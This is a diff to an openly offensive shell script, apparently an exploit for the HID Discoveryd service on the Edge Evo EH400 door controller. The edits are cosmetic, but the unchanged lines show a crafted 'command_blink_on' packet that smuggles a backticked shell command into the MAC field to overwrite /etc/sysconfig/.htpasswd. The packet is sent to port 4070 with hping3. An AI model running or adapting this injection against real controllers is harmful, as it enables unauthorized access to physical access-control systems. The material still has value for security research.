@@ -3,7 +3,7 @@
 # Writen by Mike Kelly								#
 # twitter.com/lixmk								#
 # github.com/lixmk								#
-#exfil.co									#
+# exfil.co									#
 #                                                                               #
 #	###########################################################		#
 #	# HID Discoveryd htpasswd modifier for the Edge Evo EH400 #		#
@@ -39,8 +39,8 @@ echo -e "\e[1;31m############################################################\e[
 read -e NULL
 
 # Set the follwoing 2 variables
-TARGET='<TARGET IP>'
-TMAC='<TARGET MAC>'
+TARGET='Target IP'
+TMAC='Target MAC'
 # 
 
 CMDEXEC=`which hping3`
@@ -50,9 +50,8 @@ echo 'command_blink_on;044;'${TMAC}';1`mv /tmp/htbak /etc/sysconfig/.htpasswd`;'
 echo "[*] Data file created"
 echo "[*] Executing"
 
-echo "[*] Sending Stage"
+echo "[*] Sending Payload"
 ${CMDEXEC} -2 -p 4070 -c 1 -E cleanup1.txt -d 150 ${TARGET} 2> /dev/null
-#sleep 1s	#If first attempt was unsuccessful, uncomment this line
 echo ""
 
 echo "[*] Cleanup Attempt complete"
